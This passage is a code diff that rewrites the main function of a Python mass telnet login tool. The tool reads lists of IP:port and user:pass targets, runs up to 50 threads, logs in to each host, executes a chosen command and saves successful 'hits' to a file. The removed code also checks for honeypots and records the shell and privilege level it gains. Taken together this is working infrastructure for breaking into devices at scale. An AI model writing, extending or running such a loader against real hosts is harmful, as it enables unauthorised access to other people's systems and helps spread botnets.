+â–‘   â–‘â–ˆâ–ˆâ–ˆ  â–‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–‘â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 
+    â–‘â–ˆâ–ˆâ–ˆ     â–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆ â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆ
+    â–‘â–ˆâ–ˆâ–ˆ    â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–‘â–ˆâ–ˆâ–ˆ â–‘â–‘â–‘ 
+    â–‘â–ˆâ–ˆâ–ˆ    â–‘â–ˆâ–ˆâ–ˆâ–‘â–‘â–‘   â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–‘â–‘â–‘   â–‘â–ˆâ–ˆâ–ˆ     
+    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ    
+   â–‘â–‘â–‘â–‘â–‘     â–‘â–‘â–‘â–‘â–‘â–‘  â–‘â–‘â–‘â–‘â–‘  â–‘â–‘â–‘â–‘â–‘â–‘   â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘  â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘  â–‘â–‘â–‘â–‘â–‘â–‘  â–‘â–‘â–‘â–‘â–‘     
+    """)
 
-    parser.add_argument(
-        "-l", "--list", required=True, help="File containing target list"
-    )
-    parser.add_argument(
-        "-t", "--threads", type=int, default=10, help="Number of threads (default: 10)"
-    )
-    parser.add_argument(
-        "-c",
-        "--command",
-        default="uname -a",
-        help="Command to execute (default: uname -a)",
-    )
-    parser.add_argument("-o", "--output", help="Output file for results")
-    parser.add_argument(
-        "--timeout",
-        type=int,
-        default=10,
-        help="Connection timeout in seconds (default: 10)",
-    )
-    parser.add_argument(
-        "--max-time",
-        type=int,
-        default=None,
-        help="Max total seconds per target (default: 4 * timeout)",
-    )
-    parser.add_argument(
-        "--retries",
-        type=int,
-        default=0,
-        help="Retries for transient failures (default: 0)",
-    )
+    parser = argparse.ArgumentParser(add_help=False)
+    parser.add_argument('-h', '--help', action='store_true', help='Show help menu')
+    parser.add_argument('-f', '--file', help="targets file (ip, ip:port, or 'ip:port user:pass')")
+    parser.add_argument('-x', '--target', help="single target (ip, ip:port, or 'ip:port user:pass')")
+    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of worker threads')
+    parser.add_argument('-c', '--command', help='command to execute after login')
+    parser.add_argument('-g', '--timeout', type=int, default=5, help='Socket timeout (seconds)')
+    parser.add_argument('-o', '--output', default='hits.txt', help='Output file for hits (appended)')
+    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug output')
+    parser.add_argument('-k', '--keep', action='store_true',
+                        help='Do not strip processed lines from the input file on exit')
 
     args = parser.parse_args()
 
+    if args.help or len(sys.argv) < 2:
+        print_help()
+        return
+
+    if not args.file and not args.target:
+        print(f"{R}[!] Missing arguments: provide {Y}-f/--file{C} or {Y}-x/--target{C}")
+        print(f"{C}    Run {Y}python3 main.py -h{C} for help.{W}")
+        return
+
     timeout = args.timeout
-    max_time = args.max_time if args.max_time is not None else 4 * timeout
+    command = args.command
+    output_file = args.output
+    debug = args.debug
+    input_file_path = args.file
 
-    # Load targets
-    targets = load_targets(args.list)
-
-    if not targets:
-        print("No valid targets found in the file.")
-        exit(1)
-
-    print(f"[*] Loaded {len(targets)} targets")
-    print(f"[*] Using {args.threads} threads")
-    print(f"[*] Command: {args.command}")
-    print(f"[*] Timeout: {timeout}s  Max-time: {max_time}s  Retries: {args.retries}")
-    print("=" * 60)
-
-    results = []
-    successful = 0
-    failed = 0
-    total = len(targets)
-    file_lock = Lock()
-
-    # Show initial counter
-    update_counter(total, 0, 0, total)
-
-    # Open output file for incremental writing if specified
-    out_file = None
-    if args.output:
-        out_file = open(args.output, "w")
-        out_file.write(f"teloader results — {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
-        out_file.write("=" * 60 + "\n")
-        out_file.flush()
-
+    # Make sure output file is writable (append mode)
     try:
-        # Process targets with thread pool
-        with ThreadPoolExecutor(max_workers=args.threads) as executor:
-            # Submit all tasks
-            future_to_target = {
-                executor.submit(
-                    telnet_connect_with_retry,
-                    target,
-                    args.command,
-                    timeout,
-                    max_time,
-                    args.retries,
-                ): target
-                for target in targets
-            }
+        with open(output_file, "a") as f:
+            pass
+    except Exception as e:
+        print(f"{R}[!] Cannot write to output file '{output_file}': {e}{W}")
+        return
 
-            # Process results as they complete
-            for future in as_completed(future_to_target):
-                result = future.result()
-                results.append(result)
+    print(f"{C}[{G}+{C}] Hits will be appended to: {Y}{output_file}{C}")
+    print(f"{C}[{G}+{C}] Press Ctrl+C to stop gracefully at any time.{W}")
 
-                remaining = total - len(results)
+    # Build target lines
+    if args.file:
+        try:
+            with open(args.file, "r") as fh:
+                lines = fh.readlines()
+        except FileNotFoundError:
+            print(f"{R}[!] File '{args.file}' not found{W}")
+            return
+    else:
+        lines = [args.target]
 
-                if result.get("honeypot"):
-                    # Honeypot — counted as failure, shown distinctly
-                    failed += 1
-                    text = (
-                        f"{RED}[!] HONEYPOT: {result['host']}:{result['port']} "
-                        f"({result['user']}) — {result['honeypot']} "
-                        f"(command skipped){RST}"
-                    )
-                    display_result(text, total, successful, successful, remaining)
+    # Parse each line and put on queue
+    count = 0
+    for raw in lines:
+        parsed = parse_line(raw)
+        if not parsed:
+            continue
+        ip, port, creds = parsed
+        count += 1
+        if creds:
+            queue.put((ip, port, creds, raw.rstrip("\n")))
+        else:
+            queue.put((ip, port, raw.rstrip("\n")))
 
-                    if out_file:
-                        with file_lock:
-                            out_file.write(
-                                f"[!] HONEYPOT {result['host']}:{result['port']} "
-                                f"({result['user']}) — {result['honeypot']} "
-                                f"(command skipped)\n"
-                            )
-                            out_file.flush()
-                elif result["success"]:
-                    successful += 1
-                    shell_tag = result["shell"] or "unknown"
-                    priv_tag = result["privilege"] or "?"
-                    text = (
-                        f"{GREEN}[+] SUCCESS: {result['host']}:{result['port']} "
-                        f"({result['user']}) "
-                        f"[{YELLOW}{shell_tag}{RST} | {CYAN}{priv_tag}{RST}]{RST}\n"
-                        f"    Output: {result['output'][:200]}"
-                    )
-                    display_result(text, total, successful, successful, remaining)
+    total_targets = count
 
-                    # Incremental file write
-                    if out_file:
-                        with file_lock:
-                            out_file.write(
-                                f"[+] {result['host']}:{result['port']} "
-                                f"({result['user']}) "
-                                f"[{result['shell'] or 'unknown'} | {result['privilege'] or '?'}]\n"
-                                f"    {result['output'][:500]}\n"
-                            )
-                            out_file.flush()
-                else:
-                    failed += 1
-                    text = f"{RED}[-] FAILED: {result['host']}:{result['port']} - {result['error']}{RST}"
-                    display_result(text, total, successful, successful, remaining)
+    if total_targets == 0:
+        print(f"{R}[!] No valid targets in input.{W}")
+        return
 
-                    # Incremental file write
-                    if out_file:
-                        with file_lock:
-                            out_file.write(
-                                f"[-] {result['host']}:{result['port']} - {result['error']}\n"
-                            )
-                            out_file.flush()
+    print(f"{C}[{G}+{C}] Loaded {Y}{total_targets}{C} target(s).")
+    print(f"{C}[{G}+{C}] Spawning {Y}{args.threads}{C} worker thread(s).\n")
 
-    finally:
-        # Write summary footer and close output file
-        if out_file:
-            out_file.write("\n" + "=" * 60 + "\n")
-            out_file.write(
-                f"Summary: {successful} successful, {failed} failed, {total} total\n"
-            )
-            out_file.close()
+    # Spawn worker threads
+    threads = []
+    for _ in range(args.threads):
+        t = threading.Thread(target=worker)
+        t.daemon = True
+        t.start()
+        threads.append(t)
 
-    # Clear the counter bar before printing summary
-    clear_counter()
+    # Hide cursor and start live status loop
+    stdout.write(CURSOR_HIDE)
+    stdout.flush()
+    status_thread = threading.Thread(target=status_loop, daemon=True)
+    status_thread.start()
 
-    # Print summary
-    print("\n" + "=" * 60)
-    print(
-        f"[*] Completed: {GREEN}{successful} successful{RST}, {RED}{failed} failed{RST}"
-    )
+    # Wait for queue to drain OR shutdown
+    try:
+        while not shutdown.is_set():
+            try:
+                queue.join()
+                break
+            except KeyboardInterrupt:
+                handle_signal(signal.SIGINT, None)
+    except KeyboardInterrupt:
+        handle_signal(signal.SIGINT, None)
 
-    if args.output:
-        print(f"[*] Results saved to: {args.output}")
+    if shutdown.is_set():
+        stdout.write(CLEAR_LINE)
+        print(f"{Y}[!] Waiting for in-flight logins to finish...{W}")
+    for t in threads:
+        t.join(timeout=5)
+
+    with active_lock:
+        remaining = list(active_workers)
+    for t in remaining:
+        t.join(timeout=3)
+
+    # Stop status thread
+    shutdown.set()
+    if status_thread:
+        status_thread.join(timeout=2)
+
+    # Restore cursor
+    stdout.write(CURSOR_SHOW + CLEAR_LINE)
+    stdout.flush()
+
+    # Strip processed lines from the input file
+    if input_file_path:
+        strip_completed(input_file_path, keep=args.keep)
+
+    elapsed = time.time() - start_time
+    print(f"\n[{Y}-{C}] Done. "
+          f"OK: {G}{ok_count}{C}  "
+          f"Fail: {R}{fail_count}{C}  "
+          f"Time: {Q}{human_time(elapsed)}{C}")
+    print(f"[{Y}-{C}] Hits saved to: {Y}{output_file}{W}")
 
 
 if __name__ == "__main__":
